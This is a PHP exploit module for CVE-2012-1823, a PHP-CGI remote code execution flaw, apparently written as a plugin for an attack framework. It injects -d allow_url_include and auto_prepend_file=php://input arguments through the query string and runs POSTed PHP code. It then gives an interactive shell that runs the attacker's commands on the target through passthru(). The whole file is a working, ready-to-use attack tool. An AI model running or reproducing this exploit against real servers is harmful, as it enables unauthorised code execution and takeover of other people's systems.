<?php
/*
PHP-CGI Remote Code Execution Exploit => CVE-2012-1823
Version: 1.0
Author: Logic
Date: May 10, 2013
*/
namespace exploit;
use \Framework as Framework;
     
   
   
class phpcgi extends Framework {
     
   protected $framework, $name, $description, $variables, $cookie, $os, $trigger, $post, $check, $marker1, $marker2;

    public function __construct($framework)
    {
       
        $this->framework = $framework;
        $this->name = 'PHP-CGI RCE';
        $this->description = 'Simple PHP-CGI RCE Exploit';
        $this->modName = 'phpcgi';
        $this->variables = array(
            'page' => array('required' => false, 'description' => 'Location of PHP.ini (ex test.php)', 'default' => 'test.php'),
        );
       
    }

    public function getName()
    {
        return $this->name;
    }

    public function getDesc()
    {
        return $this->description;
    }

    public function getVars()
    {
        return $this->variables;
    }

    public function getMod()
    {
        return $this->modName;
    }

    private function loadModule()
    {
        $this->setModule(1, $this->module_name);
    }

    private function installModule()
    {
        $this->addModule($this->module_name);
        $this->loadModule();
    }

    public function check()
    {
        $page = $this->framework->libs['webot']->curl_get_contents($this->target."/".$this->page);
        if (strpos($page, 'PHP Credits') !== false) {
            echo $this->framework->libs['colours']->cstring("\n\n\t[", "white");
            echo $this->framework->libs['colours']->cstring("*", "green");
            echo $this->framework->libs['colours']->cstring("] ", "white");
            echo "Target ".$this->target."/".$this->page." is Valid";
        $h = get_headers($this->target.$this->page);
            foreach ($h as $t) {
                if(strpos($t,'Windows')!==false || strpos($t,'Win32')!==false || strpos($t,'Win64')!==false){
                    $os = "Windows";
                }
                else {
                    $os = "Linux";
                }
            }
            return true;
        }
        else {
            return false;
        }
    }

    public function exploit()
    {
           
        $this->run();
               
        return 1;
    }

    public function post()
    {
        echo "This module does not support post Exploit\n";

        return 0;
    }

    public function run()
    {
        echo $this->framework->libs['colours']->cstring("\n\t[", "white");
        echo $this->framework->libs['colours']->cstring("*", "green");
        echo $this->framework->libs['colours']->cstring("] ", "white");
        echo "Attempting to Trigger Exploit";
        echo $this->framework->libs['colours']->cstring("\n\t[", "white");
        echo $this->framework->libs['colours']->cstring("*", "green");
        echo $this->framework->libs['colours']->cstring("] ", "white");
        echo "Testing if Target is Vulnerable";

        $trigger = "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
        $post = "<?php echo 'OpenWire'; ?>";
        $check = $this->framework->libs['webot']->curl_post_contents($this->target."/".$this->page.$trigger, $post);
        if (strpos($check, 'OpenWire') !==false) {
            echo $this->framework->libs['colours']->cstring("\n\t[", "white");
            echo $this->framework->libs['colours']->cstring("*", "green");
            echo $this->framework->libs['colours']->cstring("] ", "white");
            echo "Target is Vulnerable";
            $this->shell();
        }
        else {
            echo $this->framework->libs['colours']->cstring("\n\t[", "white");
            echo $this->framework->libs['colours']->cstring("*", "green");
            echo $this->framework->libs['colours']->cstring("] ", "white");
            echo "Target is not vulnerable\n";
        }
    }

    private function shell()
    {
        echo $this->framework->libs['colours']->cstring("\n\t[", "white");
        echo $this->framework->libs['colours']->cstring("*", "green");
        echo $this->framework->libs['colours']->cstring("] ", "white");
        echo "Commencing Shell Execution\n\n";
       

        $line = '';
        $exitCommands = array('quit', 'exit');
        $random1 = substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',5)),0,5);
        $random2 = substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',5)),0,5);

        $marker1 = $random1;
        $marker2 = $random2;

        do {
 
            $prompt = $this->framework->libs['colours']->cstring("$ ", "red");
            $line = readline($prompt);
                switch ($line) {
                    case 'clear':
                    case 'cls':
                        $this->clearScreen(); break;

                    default:
                        $trigger = "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
                        $post = "<?echo $marker1; passthru('$line'); echo $marker2; ?>";
                        $check = $this->framework->libs['webot']->curl_post_contents($this->target."/".$this->page.$trigger, $post);
                        echo $this->framework->libs['webot']->return_between($check, $marker1, $marker2, 1);
            }
            readline_add_history($line);
        }
        while (!in_array($line, $exitCommands));
    }
}
?>

